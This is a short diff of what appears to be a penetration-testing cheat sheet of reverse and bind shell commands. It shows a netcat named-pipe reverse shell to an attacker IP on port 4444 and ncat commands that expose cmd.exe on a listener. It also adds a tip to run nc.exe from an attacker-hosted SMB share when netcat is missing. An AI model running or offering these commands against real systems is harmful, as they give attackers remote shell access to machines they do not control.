@@ -12,6 +12,10 @@ rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
 ```
 ncat --exec cmd.exe --allow 192.168.1.101 -vnl 5555 --ssl
 ncat -nv <ip_to_connect> 4444
+
+
+If netcat exe cant be located try to host own nc.exe
+Command: \\10.10.X.X\\share\nc.exe ****
 ```
 
 ## SBD shells
